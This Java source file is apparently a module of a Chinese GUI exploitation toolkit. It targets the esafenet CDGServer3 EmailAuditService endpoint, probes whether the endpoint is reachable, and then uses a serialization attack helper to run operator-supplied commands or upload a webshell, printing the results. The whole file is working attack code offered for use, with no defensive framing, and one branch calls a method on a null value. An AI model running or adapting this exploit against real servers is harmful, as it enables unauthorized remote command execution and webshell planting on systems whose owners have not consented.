package exp.oa.esafenet.esafenetInf;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Methods;
import utils.Response;

import java.util.HashMap;

public class esafenet_EmailAuditService_serial implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response post_res = HttpTools.get(url + "/CDGServer3/EmailAuditService" , head, "utf-8");
            if (post_res.getCode() ==200 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ esafenet_EmailAuditService_serial ]");
                    textArea.appendText("\n (1) UPLOAD文件上传webshell");
                    textArea.appendText("\n (2) CMD输入命令执行");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            String cmd_echo = Methods.esafenetSerial(url + "/CDGServer3/EmailAuditService",cmd);
//
            if (cmd_echo != null) {
                if(cmd_echo.contains("uploadFile:")) {
                    Response res = HttpTools.get(url+"/CDGServer3/"+cmd_echo.replace("uploadFile:",""),new HashMap<>(),"utf-8");
                    if(res.getCode()==200 && res.getText()!=null){
                        Platform.runLater(() -> {
                            textArea.appendText("\n "+ cmd_echo +" 上传成功！");
                            textArea.appendText("\n上传路径"+url+"/CDGServer3/"+cmd_echo.replace("uploadFile:",""));
                            textArea.appendText("\n访问成功！");
                            textArea_cmd.appendText("\n上传文件访问内容:\n\n"+res.getText());
                        });
                        return true;
                    }else{
                        Platform.runLater(() -> {
                            textArea.appendText("\n "+ cmd_echo +" 上传失败！");
                        });
                        return false;
                    }

                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd +" 执行成功！");
                        textArea_cmd.appendText("\n"+cmd_echo);
                    });
                    return true;
                }
            }else{
                if(!cmd_echo.contains("uploadFile:")) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd_echo +" 上传失败！");
                    });
                    return false;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd +" 执行失败！");
                    });
                    return false;
                }
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_ECFileManageServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
